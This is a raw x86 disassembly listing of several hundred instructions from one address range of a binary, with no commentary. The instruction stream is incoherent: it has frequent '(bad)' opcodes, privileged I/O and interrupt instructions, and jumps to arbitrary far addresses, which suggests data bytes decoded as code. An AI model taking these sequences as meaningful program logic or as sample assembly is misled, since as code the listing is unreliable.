  418663:	mov    fs,WORD PTR [esp+eiz*2+0xc84a345]
  41866a:	add    BYTE PTR [edi-0x48],bl
  41866d:	enter  0x1b02,0x9
  418671:	les    ecx,FWORD PTR [eax-0x3e]
  418674:	popf   
  418675:	fsubr  QWORD PTR [ebx+0x235566a5]
  41867b:	loop   0x418609
  41867d:	out    dx,al
  41867e:	add    DWORD PTR [ecx-0x7456df2d],edx
  418684:	repnz pop edi
  418686:	mov    dh,0x15
  418688:	iret   
  418689:	or     DWORD PTR [ebx+0x75db427],edx
  41868f:	leave  
  418690:	daa    
  418691:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418692:	xchg   ebx,eax
  418693:	aam    0xe0
  418695:	and    BYTE PTR [ecx],ah
  418697:	aaa    
  418698:	les    esi,FWORD PTR [esi+ecx*2+0x6fd3f630]
  41869f:	mov    ah,0x46
  4186a1:	sub    edx,DWORD PTR [ecx+0x7fa951e6]
  4186a7:	sbb    al,0x88
  4186a9:	and    BYTE PTR [ebx+0xe],0x65
  4186ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186ae:	adc    al,0xc3
  4186b0:	xor    al,ch
  4186b2:	mov    dl,bh
  4186b4:	aas    
  4186b5:	cld    
  4186b6:	push   ss
  4186b7:	xor    esi,esp
  4186b9:	mov    WORD PTR ds:0xe81eec79,fs
  4186bf:	fist   DWORD PTR [edi-0x7c3b7304]
  4186c5:	pusha  
  4186c6:	inc    esi
  4186c7:	push   eax
  4186c8:	pop    esi
  4186c9:	dec    eax
  4186ca:	or     dl,ah
  4186cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4186cd:	jle    0x4186ef
  4186cf:	mov    ds:0xb70d4679,eax
  4186d4:	repz fld DWORD PTR [ecx]
  4186d7:	jbe    0x418685
  4186d9:	es in  al,dx
  4186db:	mov    ebx,DWORD PTR [esi+0x601e7fec]
  4186e1:	dec    edi
  4186e2:	cmp    eax,0xd586681b
  4186e7:	inc    edx
  4186e8:	cli    
  4186e9:	test   DWORD PTR [edx],esi
  4186eb:	imul   edi,DWORD PTR [edx],0x1f388b65
  4186f1:	mov    bh,0x71
  4186f3:	add    eax,DWORD PTR [edi-0x38]
  4186f6:	jl     0x4186d5
  4186f8:	(bad)  
  4186f9:	mov    cl,0xfc
  4186fb:	adc    bh,bl
  4186fd:	sub    eax,DWORD PTR [edx+0x66117c5]
  418703:	test   al,0xbf
  418705:	bound  edi,QWORD PTR [esi+eax*4+0x58eee2af]
  41870c:	lds    edi,FWORD PTR [bp-0x5430]
  418711:	mov    edx,0xeb17f067
  418716:	or     al,0x22
  418718:	jmp    0x28c805e9
  41871d:	push   ebx
  41871e:	pusha  
  41871f:	cmp    eax,0x4a19b187
  418724:	outs   dx,BYTE PTR ds:[esi]
  418725:	jmp    0x41878c
  418727:	cmc    
  418728:	adc    al,0xb3
  41872a:	sub    BYTE PTR [ebx-0x30331e92],dh
  418730:	xchg   ecx,eax
  418731:	xor    ebx,0xffffffac
  418734:	out    dx,eax
  418735:	lock rcl DWORD PTR ds:0xd346a361,0x2e
  41873d:	jo     0x4186ca
  41873f:	stc    
  418740:	mov    dh,0x4e
  418742:	std    
  418743:	inc    ecx
  418744:	inc    eax
  418745:	gs sub al,0x5d
  418748:	mov    ebp,0xb47174c7
  41874d:	mov    ebp,0xbeb36d92
  418752:	bound  edi,QWORD PTR [edx-0x741726e5]
  418758:	mov    dh,0x58
  41875a:	push   0xb5190b21
  41875f:	jmp    0x96419ba
  418764:	shl    ah,1
  418766:	mov    DWORD PTR [edi+0x1c],eax
  418769:	sbb    DWORD PTR [edx],esp
  41876b:	push   ss
  41876c:	dec    edx
  41876d:	jmp    0xfde:0xe515d21d
  418774:	daa    
  418775:	push   ebp
  418776:	jl     0x4187b1
  418778:	fwait
  418779:	cs nop
  41877b:	adc    ecx,edi
  41877d:	stos   DWORD PTR es:[edi],eax
  41877e:	jl     0x418788
  418780:	lahf   
  418781:	ss adc eax,0xee28c315
  418787:	test   DWORD PTR [ecx+0x42],0xe39242be
  41878e:	cmp    edi,DWORD PTR [eax+0x3a]
  418791:	xor    esi,DWORD PTR [ebp-0x50a1a4d9]
  418797:	add    ah,BYTE PTR [edi]
  418799:	out    dx,eax
  41879a:	mov    cl,0x14
  41879c:	add    ebx,esi
  41879e:	daa    
  41879f:	ffree  st(7)
  4187a1:	arpl   WORD PTR [ebx+0x4311d0df],si
  4187a7:	add    esp,DWORD PTR fs:[edx]
  4187aa:	dec    ebp
  4187ab:	add    ch,BYTE PTR [ebx-0x2]
  4187ae:	push   ebx
  4187af:	mov    DWORD PTR [edi-0x18ca0c4d],0x1121ab78
  4187b9:	sub    BYTE PTR ds:0x51649ae6,cl
  4187bf:	and    esi,ebx
  4187c1:	scas   al,BYTE PTR es:[edi]
  4187c2:	loopne 0x41875b
  4187c4:	pop    edi
  4187c5:	adc    BYTE PTR [eax],al
  4187c7:	repnz icebp 
  4187c9:	pop    eax
  4187ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187cb:	mov    bh,0x53
  4187cd:	pminsw mm6,QWORD PTR [ecx+0x4a]
  4187d1:	adc    BYTE PTR [edi+0x1684bf86],bl
  4187d7:	cmp    DWORD PTR [edx+ebx*8+0x6b],0xffffffa3
  4187dc:	jmp    0xad02:0x854c7f14
  4187e3:	jo     0x4187b4
  4187e5:	or     DWORD PTR [ebx+0x57],esi
  4187e8:	out    dx,eax
  4187e9:	pcmpgtd mm4,mm3
  4187ec:	in     al,0xd6
  4187ee:	mov    cl,0x6b
  4187f0:	es popa 
  4187f2:	sbb    al,0xe6
  4187f4:	add    dl,BYTE PTR [ebp-0x5fa1c15e]
  4187fa:	fcom   QWORD PTR [ebp+0x2e]
  4187fd:	clc    
  4187fe:	mov    ds:0x2751f84b,eax
  418803:	ret    0x211c
  418806:	fisttp WORD PTR [edi]
  418808:	(bad)  
  418809:	rol    eax,cl
  41880b:	dec    eax
  41880c:	fiadd  DWORD PTR [esi-0x2]
  41880f:	(bad)  
  418810:	in     eax,0xf
  418812:	pop    ds
  418813:	lods   eax,DWORD PTR ds:[esi]
  418814:	ds addr16 dec edi
  418817:	mov    edx,0x8ef122f6
  41881c:	adc    BYTE PTR [edi-0x336580f4],0x67
  418823:	sbb    eax,0x71225da7
  418828:	sbb    al,0x3b
  41882a:	std    
  41882b:	push   es
  41882c:	xlat   BYTE PTR ds:[ebx]
  41882d:	frstor [ebp+ebp*1+0x47]
  418831:	mov    ds:0xd1e424ce,al
  418836:	sub    dl,BYTE PTR [ebp-0x47]
  418839:	dec    esi
  41883a:	(bad)
  41883d:	lahf   
  41883e:	ret    
  41883f:	sti    
  418840:	jo     0x418850
  418842:	into   
  418843:	adc    al,0xbb
  418845:	mov    DWORD PTR [edx+0x4d],ecx
  418848:	retf   0x4a1e
  41884b:	outs   dx,BYTE PTR ds:[esi]
  41884c:	int3   
  41884d:	dec    edi
  41884e:	fwait
  41884f:	das    
  418850:	xchg   BYTE PTR [ebp+0x271239f4],al
  418856:	std    
  418857:	jge    0x41884c
  418859:	inc    edx
  41885a:	inc    eax
  41885b:	loopne 0x4187f9
  41885d:	rcl    DWORD PTR ds:0xb6936a3a,cl
  418863:	enter  0x1287,0xb2
  418867:	mov    ch,0x9d
  418869:	lods   eax,DWORD PTR ds:[esi]
  41886a:	shl    ecx,0x60
  41886d:	(bad)  
  41886e:	lods   eax,DWORD PTR ds:[esi]
  41886f:	repnz xor al,0x60
  418872:	jp     0x418830
  418874:	shl    DWORD PTR [edi-0x10f543e0],cl
  41887a:	mov    ds:0xb8cf27fe,al
  41887f:	mov    al,ds:0xa2ee99cf
  418884:	mov    ecx,esi
  418886:	test   dh,ch
  418888:	pop    eax
  418889:	(bad)  
  41888a:	lods   eax,DWORD PTR ds:[esi]
  41888b:	sub    al,0x1d
  41888d:	test   eax,0x75ebb981
  418892:	jne    0x4188f4
  418894:	not    al
  418896:	or     edx,DWORD PTR ds:0xd29d3059
  41889c:	cmp    DWORD PTR [edx],esp
  41889e:	loope  0x41891a
  4188a0:	xor    ebx,ebp
  4188a2:	inc    edi
  4188a3:	aas    
  4188a4:	in     eax,0x2f
  4188a6:	jbe    0x418869
  4188a8:	sbb    eax,0x77d12bca
  4188ad:	cdq    
  4188ae:	mov    edx,0x62c8a718
  4188b3:	mov    DWORD PTR [ecx],esp
  4188b5:	push   es
  4188b6:	in     al,dx
  4188b7:	and    BYTE PTR [edx+0x11],al
  4188ba:	jg     0x4188c3
  4188bc:	aas    
  4188bd:	pop    ecx
  4188be:	xor    BYTE PTR [edi],bl
  4188c0:	dec    eax
  4188c1:	cmp    edx,eax
  4188c3:	add    ecx,DWORD PTR [ecx+0x26f3cfa7]
  4188c9:	fwait
  4188ca:	(bad)  
  4188cb:	push   ecx
  4188cc:	jl     0x4188b1
  4188ce:	std    
  4188cf:	leave  
  4188d0:	mov    esi,0x3930add8
  4188d5:	es cli 
  4188d7:	sar    BYTE PTR [edx+ebx*2],1
  4188da:	jp     0x418914
  4188dc:	xor    edx,DWORD PTR [ebp+0x7]
  4188df:	stos   BYTE PTR es:[edi],al
  4188e0:	xchg   edx,eax
  4188e1:	popf   
  4188e2:	xor    eax,0xd1a4e9b8
  4188e7:	test   eax,0x938802a2
  4188ec:	imul   edx
  4188ee:	adc    dl,ah
  4188f0:	xchg   edi,eax
  4188f1:	xchg   esp,eax
  4188f2:	xor    DWORD PTR [esi+0xa],esi
  4188f5:	leave  
  4188f6:	lahf   
  4188f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188f8:	rcr    DWORD PTR [edx],1
  4188fa:	cmpxchg BYTE PTR cs:[esi],cl
  4188fe:	mov    edx,esp
  418900:	les    ecx,FWORD PTR [edx]
  418902:	jl     0x41895e
  418904:	xchg   BYTE PTR [eax],cl
  418906:	ins    BYTE PTR es:[edi],dx
  418907:	imul   edx,DWORD PTR [edi+ecx*2+0x57bb0494],0xba9199a7
  418912:	sub    DWORD PTR [eax+0x2b],0x4a8ca47f
  418919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41891a:	inc    eax
  41891b:	fsub   st,st(0)
  41891d:	ss push 0xffffff8a
  418920:	or     bh,ch
  418922:	test   ah,dh
  418924:	xchg   BYTE PTR es:[ecx+eax*1-0x3c3fe935],al
  41892c:	fwait
  41892d:	add    bh,BYTE PTR [esi-0x27]
  418930:	(bad)  
  418932:	and    DWORD PTR [ebp+0x5ddb55e2],esp
  418938:	dec    edi
  418939:	das    
  41893a:	lods   eax,DWORD PTR ds:[esi]
  41893b:	hlt    
  41893c:	sub    al,0x6e
  41893e:	jl     0x41892a
  418940:	clc    
  418941:	test   al,0xd3
  418943:	sbb    ch,cl
  418945:	add    BYTE PTR [edx-0x48e030c1],bl
  41894b:	inc    esi
  41894c:	call   0xe481cc64
  418951:	add    DWORD PTR [edi],0xffffffbb
  418954:	push   ebp
  418955:	(bad)  
  418956:	(bad)  
  418957:	iret   
  418958:	fstp   QWORD PTR [eax+0x126b7e03]
  41895e:	call   0x494b6c0d
  418963:	jns    0x418996
  418965:	mov    ds:0x89223ee,al
  41896a:	cmp    eax,0x8a52da33
  41896f:	fild   DWORD PTR [ebx]
  418971:	nop
  418972:	into   
  418973:	pop    ss
  418974:	cwde   
  418975:	mov    bl,0xfe
  418977:	jb     0x418940
  418979:	push   es
  41897a:	or     BYTE PTR [esi+0x43dfb7da],0x8f
  418981:	lahf   
  418982:	lea    ecx,[eax-0x2240a827]
  418988:	loop   0x4189d7
  41898a:	and    ch,dh
  41898c:	sbb    DWORD PTR [edi],ebp
  41898e:	fwait
  41898f:	pop    ebx
  418990:	(bad)  
  418992:	mov    ds:0x9e227544,eax
  418997:	shr    DWORD PTR [ebx-0x57f31ddf],cl
  41899d:	add    al,0x79
  41899f:	sahf   
  4189a0:	sub    dh,BYTE PTR [eax+0x4b]
  4189a3:	pop    ds
  4189a4:	jg     0x4189b3
  4189a6:	mov    DWORD PTR [eax],edx
  4189a8:	mov    al,0x89
  4189aa:	sti    
  4189ab:	cmp    DWORD PTR ds:0xa65ac643,esp
  4189b1:	(bad)  
  4189b2:	neg    DWORD PTR [eax+0x47]
  4189b5:	(bad)  
  4189b6:	sahf   
  4189b7:	pop    ss
  4189b8:	and    dl,BYTE PTR [eax+edx*4-0x11]
  4189bc:	xchg   esi,eax
  4189bd:	push   0xbf5c2e4b
  4189c2:	mov    al,0x5f
  4189c4:	mov    WORD PTR ds:[edx-0x4112e831],?
  4189cb:	and    al,0x88
  4189cd:	loope  0x418954
  4189cf:	sbb    eax,DWORD PTR [esi-0x75]
  4189d2:	cmp    al,0xb
  4189d4:	mov    ch,0x98
  4189d6:	pop    ecx
  4189d7:	(bad)  
  4189d8:	pusha  
  4189d9:	stos   BYTE PTR es:[edi],al
  4189da:	std    
  4189db:	jb     0x4189e9
  4189dd:	pop    ebp
  4189de:	add    BYTE PTR [edi-0x1bc80674],bh
  4189e4:	inc    esi
  4189e5:	cwde   
  4189e6:	aaa    
  4189e7:	jne    0x4189b8
  4189e9:	mov    DWORD PTR [ebx+0x38],edx
  4189ec:	or     bh,BYTE PTR cs:[esi+0x7d]
  4189f0:	rcl    BYTE PTR [esi+0x4a],0xca
  4189f4:	inc    ecx
  4189f5:	data16 sbb BYTE PTR [edx],bh
  4189f8:	fcmovu st,st(7)
  4189fa:	sub    eax,0x306fc219
  4189ff:	scas   al,BYTE PTR es:[edi]
  418a00:	mov    ebx,0xb91b96da
  418a05:	out    0x63,al
  418a07:	add    BYTE PTR [edi+ebp*1],ch
  418a0a:	mov    ds:0x7b8be4e8,al
  418a0f:	mov    al,ds:0xe63146b2
  418a14:	sbb    bh,BYTE PTR [eax+eiz*1]
  418a17:	adc    eax,0x7afef91c
  418a1c:	cld    
  418a1d:	push   edi
  418a1e:	sub    DWORD PTR [ebx+0x4beb4558],esp
  418a24:	dec    edi
  418a25:	cmp    eax,0x20dff698
  418a2a:	xchg   edi,eax
  418a2b:	pushf  
  418a2c:	test   ah,bh
  418a2e:	hlt    
  418a2f:	hlt    
  418a30:	leave  
  418a31:	mov    dh,0xe9
  418a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a34:	repnz or esp,esi
  418a37:	sbb    DWORD PTR [ebx],0xffffffd4
  418a3a:	stos   DWORD PTR es:[edi],eax
  418a3b:	sbb    dl,BYTE PTR [edi+esi*2+0x38]
  418a3f:	push   0xffffffea
  418a41:	psrad  mm2,QWORD PTR [edx+0x29]
  418a45:	xchg   esi,eax
  418a46:	aaa    
  418a47:	push   ebp
  418a48:	push   esp
  418a49:	cmp    al,0x6a
  418a4b:	jmp    0x418a8b
  418a4d:	lock dec ebx
  418a4f:	aaa    
  418a50:	mov    es,WORD PTR [esi]
  418a52:	dec    esp
  418a53:	add    dh,al
  418a55:	inc    ebp
  418a56:	and    ebp,DWORD PTR [esi+0x3b]
  418a59:	jmp    0x15aa:0xf0250abf
  418a60:	pop    ecx
  418a61:	jmp    0xc045d145
  418a66:	or     ch,BYTE PTR [bp+di]
  418a69:	jmp    0x2e5b4acc
  418a6e:	cwde   
  418a6f:	(bad)  
  418a70:	fadd   QWORD PTR [ebp-0x73]
  418a73:	lss    edi,FWORD PTR [ebp+0x5fc2c5fc]
  418a7a:	(bad)  
  418a7b:	and    eax,0xb8587c77
  418a80:	jns    0x418a2e
  418a82:	jb     0x418ad7
  418a84:	push   ss
  418a85:	inc    edx
  418a86:	retf   
  418a87:	and    eax,0x1a88834f
  418a8c:	imul   ecx,DWORD PTR [esi],0x34
  418a8f:	cmp    eax,0x9a297807
  418a94:	loop   0x418a3e
  418a96:	xchg   esi,eax
  418a97:	stc    
  418a98:	mov    ecx,0x692a849c
  418a9d:	rcr    BYTE PTR [ebx-0x633f03f1],0xff
  418aa4:	inc    ebp
  418aa5:	in     al,0xfe
  418aa7:	int    0xb3
  418aa9:	aas    
  418aaa:	mov    DWORD PTR [ebx],esi
  418aac:	xor    eax,0x3b85673e
  418ab1:	xor    dh,dh
  418ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ab4:	xchg   esp,eax
  418ab5:	fist   WORD PTR [edx+edx*1]
  418ab8:	add    cl,BYTE PTR [esi-0x25]
  418abb:	into   
  418abc:	adc    BYTE PTR [eax],ah
  418abe:	pop    esp
  418abf:	cmp    ecx,ebx
  418ac1:	sar    BYTE PTR [esi],cl
  418ac3:	add    eax,ebx
  418ac5:	test   DWORD PTR [ecx-0x61cc550],ecx
  418acb:	fisubr DWORD PTR [ecx]
  418acd:	(bad)  
  418ace:	sub    bl,BYTE PTR [esi-0x4f0a784b]
  418ad4:	and    ecx,DWORD PTR [ecx-0xe]
  418ad7:	ins    DWORD PTR es:[edi],dx
  418ad8:	imul   esp,DWORD PTR [ecx],0xe3c78274
  418ade:	int    0x62
  418ae0:	xchg   ebx,eax
  418ae1:	and    eax,DWORD PTR [eax-0x1bf0872b]
  418ae7:	scas   eax,DWORD PTR es:[edi]
  418ae8:	aad    0xdb
  418aea:	fwait
  418aeb:	and    DWORD PTR [esi-0x414020c4],ebp
  418af1:	fcmovu st,st(1)
  418af3:	dec    eax
  418af4:	push   cs
  418af5:	mov    ch,0xcb
  418af7:	int3   
  418af8:	mov    BYTE PTR [eax-0x3a],cl
  418afb:	inc    edi
  418afc:	adc    eax,0x17d2c066
  418b01:	and    ecx,DWORD PTR [ebx+0x2c57aa1a]
  418b07:	mov    ah,0x89
  418b09:	(bad)  
  418b0a:	and    al,0x5b
  418b0c:	scas   al,BYTE PTR es:[edi]
  418b0d:	cwde   
  418b0e:	iret   
  418b0f:	nop
  418b10:	xor    DWORD PTR [esi+0x1e],eax
  418b13:	mov    ebx,0x56622ff3
  418b18:	or     cl,BYTE PTR [edx+0x3d]
  418b1b:	xchg   esi,eax
  418b1c:	xor    bl,BYTE PTR [ecx-0x29]
  418b1f:	xchg   esp,eax
  418b20:	rcl    DWORD PTR [ebx+0x7c],0xf2
  418b24:	inc    edx
  418b25:	imul   edx,DWORD PTR [esi+0x39],0xe1414ea0
  418b2c:	push   cs
  418b2d:	jmp    0x5df5eb54
  418b32:	icebp  
  418b33:	mov    esp,0x2075b7ce
  418b38:	stos   BYTE PTR es:[edi],al
  418b39:	lock sub edx,ebx
  418b3c:	sbb    al,BYTE PTR [ebx+0x23]
  418b3f:	mov    bl,BYTE PTR [esi-0x541d3ad1]
  418b45:	mov    dh,0x45
  418b47:	test   al,0x63
  418b49:	and    eax,DWORD PTR [edi+ebx*1]
  418b4c:	mov    esi,0x7a2612cd
  418b51:	and    DWORD PTR [edx-0x4a6896a5],0x81b9e058
  418b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b5c:	cmp    eax,0xff85b1f0
  418b61:	retf   0xc737
  418b64:	fwait
  418b65:	add    dl,BYTE PTR [ebx+0x7adf065e]
  418b6b:	jns    0x418bdd
  418b6d:	stos   DWORD PTR es:[edi],eax
  418b6e:	das    
  418b6f:	add    ecx,edx
  418b71:	xchg   edx,eax
  418b72:	inc    ebx
  418b73:	lds    ebx,FWORD PTR [esi]
  418b75:	cdq    
  418b76:	jne    0x418b5f
  418b78:	push   edx
  418b79:	ret    0x8ff9
  418b7c:	hlt    
  418b7d:	div    BYTE PTR ds:0x3973f9f7
  418b83:	and    DWORD PTR [ecx+ecx*1+0x34],esp
  418b87:	dec    ebx
  418b88:	cld    
  418b89:	mov    bl,0xff
  418b8b:	fisttp WORD PTR [ecx]
  418b8d:	in     al,0xd5
  418b8f:	xor    cl,BYTE PTR [ecx-0x2b98e7ac]
  418b95:	pushf  
  418b96:	jae    0x418b88
  418b98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b99:	inc    esi
  418b9a:	out    dx,eax
  418b9b:	call   0xb4e61c5e
  418ba0:	test   BYTE PTR [esp],dh
  418ba3:	test   BYTE PTR [esi+0x32a1e774],dh
  418ba9:	mov    DWORD PTR [eax-0x1e],eax
  418bac:	add    BYTE PTR [eax+ecx*4+0x6b],cl
  418bb0:	mov    ds:0xe07e2685,eax
  418bb5:	and    BYTE PTR [ebx+0x1e],0x46
  418bb9:	stos   BYTE PTR es:[edi],al
  418bba:	cmp    eax,0x2adea9bb
  418bbf:	mov    bl,0x94
  418bc1:	jbe    0x418c28
  418bc3:	inc    edx
  418bc4:	stos   DWORD PTR es:[edi],eax
  418bc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418bc6:	mov    ch,BYTE PTR [edx+ebp*4+0xa]
  418bca:	in     eax,0x6a
  418bcc:	push   cs
  418bcd:	cld    
  418bce:	add    al,0x30
  418bd0:	mov    BYTE PTR [ecx+ebp*1-0x31],ah
  418bd4:	dec    eax
  418bd5:	jo     0x418bbc
  418bd7:	mov    ebx,0x9bcf48bd
  418bdc:	add    bl,BYTE PTR [ebp-0x13aadbd5]
  418be2:	pushf  
  418be3:	sub    eax,0xb1aebf50
  418be8:	(bad)  
  418be9:	cmp    ch,BYTE PTR [ecx+0x65ef9692]
  418bef:	xchg   DWORD PTR [edi+0x6471cf91],esi
  418bf5:	sahf   
  418bf6:	mov    ch,0x38
  418bf8:	inc    edi
  418bf9:	sbb    ch,ah
  418bfb:	arpl   WORD PTR [edi-0x6b2a80],bp
  418c01:	push   ds
  418c02:	shl    BYTE PTR [esi],cl
  418c04:	cmp    BYTE PTR [ebp+0x5e],0xb9
  418c08:	push   edi
  418c09:	rcr    DWORD PTR [edi],0x66
  418c0c:	or     al,ah
  418c0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c0f:	addr16 mov gs,edi
  418c12:	adc    BYTE PTR [bx+0x61],ch
  418c16:	lock inc ecx
  418c18:	or     dl,dh
  418c1a:	ds retf 0x3d60
  418c1e:	adc    bh,BYTE PTR [eax-0x1c07084a]
  418c24:	push   ds
  418c25:	sub    al,0x78
  418c27:	sti    
  418c28:	mov    bl,0xa7
  418c2a:	adc    edx,0x1dfb347d
  418c30:	dec    esi
  418c31:	aas    
  418c32:	dec    eax
  418c33:	popf   
  418c34:	dec    edx
  418c35:	jno    0x418c7d
  418c37:	aad    0xf9
  418c39:	cmp    eax,0xde25242b
  418c3e:	cmp    BYTE PTR [edx+0x3cf8d069],cl
  418c44:	fucom  st(7)
  418c46:	out    dx,al
  418c47:	adc    ecx,DWORD PTR [ecx-0x40]
  418c4a:	les    esp,FWORD PTR [ebx+0x25b70dec]
  418c50:	xchg   ebx,eax
  418c51:	dec    edi
  418c52:	aaa    
  418c53:	ret    
  418c54:	jnp    0x418bec
  418c56:	mov    ah,0x2d
  418c58:	sbb    BYTE PTR [esi-0x3a],al
  418c5b:	mov    ebx,ebp
  418c5d:	les    ebx,FWORD PTR [edi]
  418c5f:	cmp    DWORD PTR [ebx+edx*2-0x59],edx
  418c63:	in     al,0xa4
  418c65:	jp     0x418c7b
  418c67:	jl     0x418c7e
  418c69:	cmp    DWORD PTR [eax+0xba19958],edi
  418c6f:	sbb    BYTE PTR [eax],dl
  418c71:	jbe    0x418c47
  418c73:	jno    0x418c58
  418c75:	shr    DWORD PTR [edi+0x7cc95544],cl
  418c7b:	dec    ebx
  418c7c:	fimul  DWORD PTR [edx]
  418c7e:	cmp    eax,0x32c1a6bf
  418c83:	scas   eax,DWORD PTR es:[di]
  418c85:	out    0xaa,eax
  418c87:	jnp    0x418cd6
  418c89:	and    DWORD PTR [ebx+edx*4+0x5c25a793],esp
  418c90:	sub    eax,0x2f555735
  418c95:	mov    bl,0xb
  418c97:	sbb    cl,0x9f
  418c9a:	mov    ebp,0x49af7f75
  418c9f:	xor    eax,DWORD PTR [edx+0x42215b4f]
  418ca5:	pop    esp
  418ca6:	dec    edi
  418ca7:	cmp    DWORD PTR [ebp+0x627d668],ebx
  418cad:	add    edi,DWORD PTR [eax+0x55]
  418cb0:	add    DWORD PTR [ebx+0x15],0xffffffe8
  418cb4:	fs stos BYTE PTR es:[edi],al
  418cb6:	mov    al,ds:0x3da24c29
  418cbb:	(bad)  
  418cbc:	pop    ss
  418cbd:	and    al,0x4b
  418cbf:	and    BYTE PTR [ebx+ebp*4-0x49],dh
  418cc3:	or     eax,0xd2d25396
  418cc8:	xlat   BYTE PTR ds:[ebx]
  418cc9:	cmp    DWORD PTR [esi+0x78],0x139317f5
  418cd0:	mul    DWORD PTR [ebx+0x15]
  418cd3:	imul   eax,DWORD PTR [eax+0x7f],0x5144d0dc
  418cda:	in     al,0x5
  418cdc:	sbb    al,0xc2
  418cde:	add    eax,0xdfdff72a
  418ce3:	ss mov edi,0x21d20e2f
  418ce9:	jmp    0x418c99
  418ceb:	or     DWORD PTR [eax+edx*2-0x7bff205],eax
  418cf2:	loope  0x418d5f
  418cf4:	cmp    al,0x19
  418cf6:	das    
  418cf7:	push   ebp
  418cf8:	inc    eax
  418cf9:	lods   eax,DWORD PTR ds:[esi]
  418cfa:	add    ah,BYTE PTR [esi-0x3d3afdbc]
  418d00:	ds cdq 
  418d02:	mov    esp,0xa8515029
  418d07:	jb     0x418d2c
  418d09:	out    dx,al
  418d0a:	ja     0x418d4a
  418d0c:	loope  0x418cd4
  418d0e:	outs   dx,BYTE PTR ds:[esi]
  418d0f:	mov    bh,bh
  418d11:	les    edi,FWORD PTR [edx+0x4c]
  418d14:	stos   BYTE PTR es:[edi],al
  418d15:	cmp    al,0x3a
  418d17:	call   0xacca56f
  418d1c:	ins    DWORD PTR es:[edi],dx
  418d1d:	adc    DWORD PTR [ecx],edi
  418d1f:	or     edx,DWORD PTR [ebx-0x2d]
  418d22:	mov    al,ds:0x974394d5
  418d27:	scas   al,BYTE PTR es:[edi]
  418d28:	fcmovb st,st(5)
  418d2a:	ret    
  418d2b:	into   
  418d2c:	sub    DWORD PTR [edx+ebx*8],edx
  418d2f:	(bad)  
  418d31:	dec    ecx
  418d32:	popa   
  418d33:	add    DWORD PTR [edx+0x60],esp
  418d36:	adc    esp,eax
  418d38:	retf   
  418d39:	mov    eax,ds:0x2aaad206
  418d3e:	mov    cl,0xd8
  418d40:	add    al,dl
  418d42:	jae    0x418d23
  418d44:	lea    esp,[edx-0x62]
  418d47:	fxtract 
  418d49:	or     DWORD PTR [ecx-0x3f0a8cb6],edi
  418d4f:	retf   0x4d26
  418d52:	test   al,0xc4
  418d54:	mov    eax,ds:0x64c68975
  418d59:	or     ecx,ebp
  418d5b:	add    BYTE PTR [edx-0x285c1439],dh
  418d61:	rol    esi,cl
  418d63:	mov    ch,0x52
  418d65:	fs out 0x13,al
  418d68:	pop    edi
  418d69:	add    bh,0x58
  418d6c:	outs   dx,BYTE PTR ds:[esi]
  418d6d:	pop    eax
  418d6e:	lock out dx,eax
  418d70:	mov    ebx,0xb8e800b4
  418d75:	jbe    0x418d95
  418d77:	adc    DWORD PTR [edx],edx
  418d79:	nop
  418d7a:	lea    esi,[ebx+0xf]
  418d7d:	daa    
  418d7e:	outs   dx,BYTE PTR ds:[esi]
  418d7f:	sahf   
  418d80:	push   esp
  418d81:	adc    DWORD PTR [esi+ecx*8],edi
  418d84:	stos   BYTE PTR es:[edi],al
  418d85:	(bad)  
  418d86:	rcl    DWORD PTR [eax+0x4e],1
  418d89:	(bad)  
  418d8a:	pop    esp
  418d8b:	cmp    edx,DWORD PTR [ebp+0x10]
  418d8e:	mov    ebx,0x1115562b
  418d93:	(bad)  
  418d94:	clc    
  418d95:	add    eax,0x7daaf1b4
  418d9a:	mov    edi,0x6e4a132
  418d9f:	mov    esp,0xfacdf238
  418da4:	ror    DWORD PTR [esi-0x6d],cl
  418da7:	shr    DWORD PTR [eax+0x79],cl
  418daa:	dec    eax
  418dab:	div    DWORD PTR [edx+0x43]
  418dae:	dec    ebx
  418daf:	sbb    al,0x72
  418db1:	fidiv  WORD PTR [edi-0x61]
  418db4:	ss cmp al,0xa6
  418db7:	cmp    al,0xe8
  418dba:	push   ebp
  418dbb:	mov    cl,0x88
  418dbd:	dec    esi
  418dbe:	cmp    DWORD PTR [esi],edi
  418dc0:	daa    
  418dc1:	adc    DWORD PTR ds:0x28b8113,edi
  418dc7:	push   edx
  418dc8:	pop    ecx
  418dc9:	in     al,0xeb
  418dcb:	pop    edi
  418dcc:	push   edx
  418dcd:	enter  0xeed5,0x1b
  418dd1:	mov    al,ds:0xc39e1d63
  418dd6:	add    eax,0x6dfc319c
  418ddb:	jl     0x418e0d
  418ddd:	mov    dh,0x59
  418ddf:	dec    edx
  418de0:	int3   
  418de1:	xchg   DWORD PTR [ebx+edx*1-0x6a795780],esi
  418de8:	push   eax
  418de9:	fiadd  DWORD PTR [ebx-0x52]
  418dec:	shl    BYTE PTR [edx+0x77c3627],1
  418df2:	xor    al,0xdc
  418df4:	pop    edx
  418df5:	xchg   edi,eax
  418df6:	cmc    
  418df7:	test   eax,0xe242c643
  418dfc:	jns    0x418e4f
  418dfe:	retf   
  418dff:	or     al,bl
  418e01:	push   ebx
  418e02:	scas   al,BYTE PTR es:[edi]
  418e03:	or     ebp,DWORD PTR [ebp-0x70]
  418e06:	lods   al,BYTE PTR ds:[esi]
  418e07:	jle    0x418e2b
  418e09:	push   0x60c6f118
  418e0e:	iret   
  418e0f:	(bad)  
  418e10:	push   ebx
  418e11:	rol    cl,0xff
  418e14:	cmp    DWORD PTR [ecx+0x4d7b5b9e],ebp
  418e1a:	xchg   dh,dl
  418e1c:	xchg   BYTE PTR [esi-0x46],al
  418e1f:	mov    ah,0xd7
  418e21:	dec    edi
  418e22:	daa    
  418e23:	sbb    BYTE PTR [esi],bh
  418e25:	(bad)
  418e28:	dec    eax
  418e29:	adc    al,0x2
  418e2b:	mov    bh,0xde
  418e2d:	es call 0x48943b58
